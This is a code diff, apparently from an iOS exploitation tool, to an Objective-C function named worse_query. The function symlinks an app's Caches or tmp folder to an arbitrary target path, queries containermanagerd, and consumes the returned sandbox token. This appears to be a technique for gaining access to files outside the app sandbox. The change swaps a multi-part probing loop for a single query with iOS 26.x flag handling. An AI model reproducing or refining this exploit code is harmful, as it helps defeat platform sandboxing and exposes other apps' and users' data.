@@ -143,66 +143,46 @@ int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool crea
         query_set_group_identifiers(query, identifier);
         wq_log(@"Query configured: class=7 identifier=%@", group);
     }
+    // part selects the base path inside the container: 3 = Library/Caches, 1 = Documents, 5 = tmp.
+    query_set_part(query, ownContainer ? 5 : 3);
+    if (alt_flags) {
+        query_set_flags(query, 0x0000000800000000ULL); // Accessing App Group containers on iOS 26.x needs different flags, for whatever reason
+    } else {
+        query_set_flags(query, 0x0000008000000000ULL);
+    }
+
+    wq_log(@"Query configured: class=7 part=3 flags=%@", alt_flags ? @"0x0000000800000000" : @"0x0000008000000000");
+    // Preserve the original App Group cache item during this query. A shared
+    // group may contain another app's data; replacing it must not erase it.
     int64_t handle = -4;
     NSError *cacheError = nil;
-    BOOL restored = NO;
-
-    if (ownContainer) {
-        // No App Group: probe every container part until one resolves the tmp
-        // directory that was swapped for the target path.
-        query_free(query);
-        if (!query_set_identifiers) {
-            wq_log(@"container_query_set_identifiers unavailable, return=-2");
-            dlclose(mgr);
-            return -2;
+    BOOL restored = GXWithTemporaryCacheLink([NSURL fileURLWithPath:caches], target, ^int64_t {
+        wq_log(@"Caches symlink created; submitting query");
+        void *result = query_get_single_result(query);
+        if (!result) {
+            gWQLastError = @"containermanagerd rejected the query (part mismatch or container unavailable)";
+            wq_log(@"containermanagerd rejected query, return=-5");
+            return -5;
         }
-        for (uint64_t probe = 1; probe <= 8; probe++) {
-            void *q = query_create();
-            if (!q) break;
-            query_set_class(q, 2);
-            xpc_object_t ident = xpc_string_create(NSBundle.mainBundle.bundleIdentifier.UTF8String);
-            query_set_identifiers(q, ident);
-            query_set_part(q, probe);
-            query_set_flags(q, alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL);
-
-            int64_t h = -4;
-            NSError *err = nil;
-            BOOL r = GXWithTemporaryCacheLink([NSURL fileURLWithPath:caches], target, ^int64_t {
-                void *result = query_get_single_result(q);
-                if (!result) { wq_log(@"part %llu: containermanagerd rejected", (unsigned long long)probe); return (int64_t)-5; }
-                char *token = copy_sandbox_token(result);
-                if (!token) { wq_log(@"part %llu: token unavailable", (unsigned long long)probe); return (int64_t)-6; }
-                int64_t consumed = consume_extension(token);
-                free(token);
-                return consumed;
-            }, &h, &err);
-            query_free(q);
-
-            wq_log(@"part %llu -> handle=%lld restored=%d err=%@",
-                   (unsigned long long)probe, (long long)h, r, err.localizedDescription ?: @"-");
-            if (r && h >= 0) {
-                handle = h; restored = YES; cacheError = nil; gWQLastError = nil;
-                break;
-            }
-            handle = h;
-            cacheError = err;
-            gWQLastError = [NSString stringWithFormat:@"part %llu -> %lld (%@)",
-                            (unsigned long long)probe, (long long)h, err.localizedDescription ?: @"no error"];
+        wq_log(@"Query returned a container result");
+        char *token = copy_sandbox_token(result);
+        if (!token) {
+            gWQLastError = @"container found but sandbox token was empty";
+            wq_log(@"Sandbox token unavailable, return=-6");
+            return -6;
         }
-    } else {
-        query_set_part(query, 3);
-        query_set_flags(query, alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL);
-        restored = GXWithTemporaryCacheLink([NSURL fileURLWithPath:caches], target, ^int64_t {
-            void *result = query_get_single_result(query);
-            if (!result) return (int64_t)-5;
-            char *token = copy_sandbox_token(result);
-            if (!token) return (int64_t)-6;
-            int64_t consumed = consume_extension(token);
-            free(token);
-            return consumed;
-        }, &handle, &cacheError);
-        query_free(query);
-    }
+        wq_log(@"Sandbox token received (contents omitted); consuming extension");
+        int64_t consumed = consume_extension(token);
+        free(token);
+        if (consumed >= 0) wq_log(@"Extension consumed: handle=%lld", (long long)consumed);
+        else {
+            gWQLastError = [NSString stringWithFormat:@"sandbox_extension_consume failed (errno %d: %s)",
+                            errno, strerror(errno)];
+            wq_log(@"Extension consume failed: handle=%lld errno=%d (%s)", (long long)consumed, errno, strerror(errno));
+        }
+        return consumed;
+    }, &handle, &cacheError);
+    query_free(query);
     dlclose(mgr);
     if (!restored) {
         if (handle >= 0) worse_query_release(handle);
